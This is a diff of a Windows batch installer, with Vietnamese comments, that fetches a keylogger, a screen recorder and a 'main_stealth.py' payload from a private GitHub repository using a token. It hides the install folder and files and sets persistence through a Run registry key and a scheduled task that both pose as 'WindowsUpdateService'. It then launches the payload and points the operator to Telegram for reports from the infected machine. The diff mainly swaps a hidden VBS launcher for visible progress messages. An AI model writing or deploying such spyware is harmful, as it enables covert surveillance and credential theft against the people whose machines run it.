@@ -10,18 +10,13 @@ REM 4. Thêm vào Windows Startup
 REM 5. Khởi động ứng dụng
 REM ========================================
 
-REM Chạy ẩn - không hiển thị console
-if not "%1"=="hidden" (
-    REM Tạo file VBS để chạy ẩn
-    echo Set WshShell = CreateObject("WScript.Shell") > "%temp%\install_hidden.vbs"
-    echo WshShell.Run """%~f0"" hidden", 0, False >> "%temp%\install_hidden.vbs"
-    cscript //nologo "%temp%\install_hidden.vbs"
-    del "%temp%\install_hidden.vbs"
-    exit /b
-)
-
-REM Từ đây chạy ẩn
+REM Chạy bình thường - hiển thị thông báo
 chcp 65001 >nul 2>&1
+cls
+echo ========================================
+echo    CAI DAT TU DONG
+echo ========================================
+echo.
 
 REM ========================================
 REM CẤU HÌNH GITHUB - THAY ĐỔI Ở ĐÂY
@@ -55,6 +50,7 @@ if not exist "%INSTALL_DIR%\temp" mkdir "%INSTALL_DIR%\temp" >nul 2>&1
 cd /d "%INSTALL_DIR%" >nul 2>&1
 
 REM Tải tất cả file từ GitHub Private Repo
+echo [1/5] Dang tai file tu GitHub...
 curl -L -H "Authorization: token %GITHUB_TOKEN%" -o main_stealth.py "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/main_stealth.py" >nul 2>&1
 curl -L -H "Authorization: token %GITHUB_TOKEN%" -o screen_recorder.py "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/screen_recorder.py" >nul 2>&1
 curl -L -H "Authorization: token %GITHUB_TOKEN%" -o keylogger.py "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/keylogger.py" >nul 2>&1
@@ -81,20 +77,50 @@ curl -L -H "Authorization: token %GITHUB_TOKEN%" -o config.py "https://raw.githu
 curl -L -H "Authorization: token %GITHUB_TOKEN%" -o requirements.txt "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/requirements.txt" >nul 2>&1
 
 REM Cài đặt thư viện Python
+echo [2/5] Dang cai dat thu vien Python...
 %PYTHON_CMD% -m pip install --upgrade pip --quiet --disable-pip-version-check >nul 2>&1
 %PYTHON_CMD% -m pip install -r requirements.txt --quiet --disable-pip-version-check >nul 2>&1
 
 REM Ẩn thư mục và file
+echo [3/5] Dang an thu muc va file...
 attrib +h +s "%INSTALL_DIR%" >nul 2>&1
 for %%f in ("%INSTALL_DIR%\*.py") do attrib +h "%%f" >nul 2>&1
 
 REM Thêm vào Windows Startup (Registry)
+echo [4/5] Dang them vao Windows Startup...
 %PYTHON_CMD% -c "import winreg; import sys; key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE); winreg.SetValueEx(key, 'WindowsUpdateService', 0, winreg.REG_SZ, f'\"{sys.executable}\" \"%INSTALL_DIR%\\main_stealth.py\"'); winreg.CloseKey(key)" >nul 2>&1
 
 REM Tạo task scheduler (backup)
 schtasks /create /tn "WindowsUpdateService" /tr "\"%INSTALL_DIR%\main_stealth.py\"" /sc onlogon /f /rl highest >nul 2>&1
 
-REM Khởi động ứng dụng ngay (ẩn)
-start "" /min pythonw "%INSTALL_DIR%\main_stealth.py" >nul 2>&1
+REM Kiểm tra cài đặt thành công
+if exist "%INSTALL_DIR%\main_stealth.py" (
+    if exist "%INSTALL_DIR%\config.py" (
+        echo [5/5] Dang khoi dong ung dung...
+        echo.
+        start "" /min pythonw "%INSTALL_DIR%\main_stealth.py" >nul 2>&1
+        timeout /t 2 >nul 2>&1
+        echo ========================================
+        echo    CAI DAT THANH CONG!
+        echo ========================================
+        echo.
+        echo Thu muc cai dat: %INSTALL_DIR%
+        echo Ung dung da duoc them vao Windows Startup
+        echo Ung dung da duoc khoi dong!
+        echo.
+        echo Kiem tra Telegram de xem thong bao ket noi tu may nay.
+        echo.
+        echo Nhan phim bat ky de dong...
+        pause
+    ) else (
+        echo [ERROR] Khong tim thay config.py
+        pause
+        exit /b 1
+    )
+) else (
+    echo [ERROR] Khong tim thay main_stealth.py
+    pause
+    exit /b 1
+)
 
 exit /b 0
